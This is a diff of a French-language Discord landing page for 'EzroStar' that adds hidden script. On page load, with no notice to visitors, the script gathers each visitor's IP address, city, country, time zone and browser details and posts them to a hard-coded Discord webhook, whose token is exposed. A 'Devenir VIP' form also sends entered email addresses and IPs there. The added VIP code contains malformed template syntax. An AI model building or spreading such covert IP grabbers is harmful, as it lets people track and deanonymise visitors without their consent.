@@ -1,90 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maintenance</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
-    <style>
-        body {
-            background-color: #333; /* Fond gris foncé */
-            color: white; /* Texte blanc */
-            font-family: 'Rubik', sans-serif; /* Utilise la police Rubik */
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-
-        h1 {
-            font-size: 36px;
-            margin-bottom: 20px; /* Espace sous le titre */
-        }
-
-        p {
-            font-size: 18px;
-            margin-bottom: 30px; /* Espace sous le paragraphe */
-        }
-
-        .discord-button {
-            background-color: #7289DA; /* Couleur du bouton Discord */
-            color: white;
-            font-size: 16px;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            text-decoration: none; /* Supprime le soulignement du lien */
-        }
-
-        .discord-button:hover {
-            background-color: #677BC4; /* Changement de couleur au survol */
-        }
-
-        .vip-form {
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #emailInput {
-            margin-bottom: 10px;
-            padding: 8px;
-            font-size: 14px;
-        }
-
-        #devenirVIPButton {
-            background-color: #7289DA;
-            color: white;
-            font-size: 14px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        #devenirVIPButton:hover {
-            background-color: #677BC4;
-        }
-    </style>
+    <!-- ... (autres balises meta et liens) ... -->
 </head>
 <body>
     <h1>Bienvenue sur le site d'EzroStar. Veuillez rejoindre le Discord pour plus d'infos :</h1>
     <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
-
-    <div class="vip-form">
-        <input type="email" id="emailInput" placeholder="Entrez votre adresse e-mail">
-        <button id="devenirVIPButton" onclick="devenirVIP()">Devenir VIP</button>
-    </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
@@ -103,30 +24,61 @@
             return data;
         };
 
-        const devenirVIP = async () => {
-            const email = document.getElementById("emailInput").value;
-
-            const ipAddress = await getIpAddress();
-            const ipGeolocationData = await getIpGeolocation(ipAddress);
-
-            const embed = {
-                title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-                description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||\n<:2933email:1210210505853255682> Adresse Mail: || ${email} ||**`,
-                color: 0x00ff00
-            };
-
-            const payload = {
-                embeds: [embed]
-            };
-
-            // Envoie du message via le webhook Discord
+        const sendWebhook = async (embed) => {
             await fetch(webhookURL, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ embeds: [embed] })
             });
+        };
+
+        const sendWebhookOnce = async () => {
+            // Vérifie si le message a déjà été envoyé en utilisant le stockage local
+            if (!localStorage.getItem("webhookSent")) {
+                const ipAddress = await getIpAddress();
+                const ipGeolocationData = await getIpGeolocation(ipAddress);
+
+                const embed = {
+                    title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
+                    description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||**`,
+                    color: 0x00ff00
+                };
+
+                // Envoie du message via le webhook Discord
+                await sendWebhook(embed);
+
+                // Marque le message comme déjà envoyé
+                localStorage.setItem("webhookSent", "true");
+            }
+        };
+
+        // Appelle la fonction au chargement de la page
+        sendWebhookOnce();
+    </script>
+
+    <!-- Ajoutez cette partie pour gérer le formulaire VIP -->
+    <h2>Devenir VIP</h2>
+    <form id="vipForm">
+        <label for="email">Adresse E-mail :</label>
+        <input type="email" id="email" name="email" required>
+        <button type="button" onclick="becomeVIP()">Devenir VIP</button>
+    </form>
+
+    <script>
+        const becomeVIP = async () => {
+            const email = document.getElementById("email").value;
+            const ipAddress = await getIpAddress();
+
+            const vipEmbed = {
+                title: "<:FakeNitroEmoji:1209487670561210419> Devenir VIP!",
+                description: `:FakeNitroEmoji: Nouveau membre a rejoint le site!\n:3228info: Adresse IP: ` ${ipAddress} `\n:email: Adresse E-mail: ` ${email} ``,
+                color: 0xFFD700
+            };
+
+            // Envoie du message VIP via le webhook Discord
+            await sendWebhook(vipEmbed);
         };
     </script>
 </body>
